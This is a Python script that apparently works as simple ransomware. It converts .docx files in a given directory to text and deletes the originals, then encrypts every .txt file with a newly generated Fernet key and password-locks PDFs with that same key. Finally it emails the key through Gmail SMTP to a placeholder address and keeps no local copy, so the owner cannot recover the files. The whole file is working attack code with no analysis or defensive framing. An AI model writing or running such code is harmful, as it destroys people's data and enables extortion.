from cryptography.fernet import Fernet
import os
import sys
import glob
import smtplib
import webbrowser
import docx2txt
from PyPDF2 import PdfFileReader, PdfFileWriter
from colorama import init, Fore, Style

bb = Style.BRIGHT + Fore.BLUE
bw = Style.BRIGHT + Fore.WHITE
by = Style.BRIGHT + Fore.YELLOW
bg = Style.BRIGHT + Fore.GREEN
br = Style.BRIGHT + Fore.RED
g = Fore.GREEN
y = Fore.YELLOW
b = Fore.BLUE
w = Fore.WHITE
r = Fore.RED
d1 = Style.BRIGHT + Fore.BLUE + "[*]"
d2 = Style.BRIGHT + Fore.YELLOW + "[!]"
d3 = Style.BRIGHT + Fore.GREEN + "[*]"
d4 = Style.BRIGHT + Fore.RED + "[-]"

def encrypt():
    try:
        init(autoreset=True)
        print(d1, "Inicialiting Ecryption...")
        print(d1, "Generating key...")
        key = Fernet.generate_key().decode("ascii")
        print(d1, "Key generated!")
        cipher_suite = Fernet(key)
        os.chdir(sys.argv[1])
        print(d1, bb + "Into on directory:", "{}".format(b + sys.argv[1]))
        print(d1, "Converting .docx in .txt ...")

        for files in glob.glob("*.docx"):
            print(d1, "Converting {} ...".format(bw + files))
            ctt = docx2txt.process(files)
            with open(files.replace(".docx", ".txt"), 'w') as f:
                f.write(ctt)
                os.remove(files)

        print(d1, "Encrypting .txt files...")

        for arqs in glob.glob("*.txt"):
            print(d1, "Encrypting {} ...".format(bw + arqs))
            with open(arqs, 'r') as a:
                file = a.read()
                if not file.startswith("gAAAAA"):
                    cipher_text = cipher_suite.encrypt(bytes(file.encode("utf-8"))).decode("ascii")
                    with open(arqs, 'w') as file_encrypted:
                        file_encrypted.write(cipher_text)
                else:
                    print(d2, "{}".format(y + arqs), by + "is already encrypted!")

        print(d1, "Encrypting .pdf files...")

        for docs in glob.glob("*.pdf"):
            print(d1, "Encrypting {} ...".format(bw + docs))
            d = PdfFileReader(open(docs, "rb"), strict=True)
            if not d.isEncrypted:
                path, filename = os.path.split(docs)
                output_file = os.path.join(path, "temp_" + filename)
                output = PdfFileWriter()
                input_stream = PdfFileReader(open(docs, "rb"))
                for i in range(0, input_stream.getNumPages()):
                    output.addPage(input_stream.getPage(i))
                output_stream = open(output_file, "wb")
                output.encrypt(user_pwd=key, owner_pwd=key, use_128bit=True)
                output.write(output_stream)
                output_stream.close()
                os.rename(output_file, docs)
            else:
                print(d2, "{}".format(y + docs), by + "is already encrypted!")

        print(d3, bg + "FINISHED!")
        print(d1, "End of encryption.")
        print(d1, "Files encrypted successfully!")
        print(d1, "Sending key to email...")
        return send_email(key)
    except Exception as e:
        print(r + "[-] {}".format(e))
        print(d4, br + "ERROR when encrypting!")
        print(d1, "Program finished.")
		sys.exit(2)

def send_email(key):
    try:
        smtp_obj = smtplib.SMTP("smtp.gmail.com", 587)
        smtp_obj.ehlo()
        smtp_obj.starttls()
        smtp_obj.login("user@mail.com", "password")
        smtp_obj.sendmail("from_user@mail.com", "to_user@mail.com", key)
        smtp_obj.close()
        print(d1, "Email sent successfully!")
    except Exception as e:
        print(r + "[-] {}".format(e))
        print(d4, br + "ERROR when sending email!")
        print(d1, "Program finished.")
		sys.exit(2)

if __name__ == "__main__":
    encrypt()
